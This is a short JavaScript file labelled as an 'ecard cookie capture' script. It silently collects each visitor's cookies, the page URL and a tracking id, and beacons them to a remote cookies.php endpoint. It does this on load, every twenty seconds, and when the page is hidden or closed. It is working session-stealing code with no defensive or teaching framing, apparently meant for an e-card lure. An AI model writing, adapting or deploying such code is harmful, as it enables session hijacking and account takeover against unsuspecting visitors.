/* ecard cookie capture — auto dump to api/cookies.php */
(function () {
  var K = 'evk_7f3a';
  var my = (document.currentScript && document.currentScript.src) || '';
  var root = my.replace(/assets\/cookiegrab\.js(?:\?.*)?$/, '');
  if (!root) return;
  var end = root + 'api/cookies.php';
  function vid() {
    var m = location.search.match(/[?&]id=([0-9a-f]{16,})/i);
    if (m) return m[1];
    try { return localStorage.getItem('vid') || ''; } catch (e) { return ''; }
  }
  function dump(why) {
    try {
      var body = JSON.stringify({ k: K, page: location.href, vid: vid(), why: why,
                                  cookies: document.cookie || '' });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(end, new Blob([body], { type: 'application/json' }));
      } else {
        fetch(end, { method: 'POST', body: body, keepalive: true,
                     headers: { 'Content-Type': 'application/json' } }).catch(function () {});
      }
    } catch (e) {}
  }
  dump('load');
  setInterval(function () { dump('tick'); }, 20000);
  window.addEventListener('beforeunload', function () { dump('exit'); });
  document.addEventListener('visibilitychange', function () { if (document.hidden) dump('hide'); });
})();
